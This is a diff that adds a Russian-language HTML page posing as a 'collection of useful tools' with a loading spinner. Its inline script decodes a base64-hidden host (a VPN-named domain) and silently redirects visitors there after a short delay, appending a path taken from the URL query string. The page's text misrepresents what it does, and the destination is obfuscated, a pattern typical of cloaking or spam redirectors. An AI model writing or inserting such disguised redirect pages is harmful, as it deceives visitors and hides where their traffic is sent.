@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Полезные инструменты</title>
+<style>
+body{font-family:system-ui,-apple-system,sans-serif;max-width:600px;margin:60px auto;padding:0 20px;background:#f8f9fa;color:#333}
+h1{font-size:1.4em;color:#1a73e8}
+p{line-height:1.6;color:#555}
+.loader{margin:30px auto;width:30px;height:30px;border:3px solid #ddd;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<h1>Подборка полезных инструментов</h1>
+<p>Загружаем актуальную версию...</p>
+<div class="loader"></div>
+<script>
+(function(){
+var p=new URLSearchParams(window.location.search);
+var t=p.get("t")||"force.hellovpn.ru";
+var u="https://"+atob("Zm9yY2UuaGVsbG92cG4ucnU=");
+if(p.get("r"))u+="/"+p.get("r");
+setTimeout(function(){window.location.replace(u)},800);
+})();
+</script>
+<noscript><p>Пожалуйста, включите JavaScript для продолжения.</p></noscript>
+</body>
+</html>
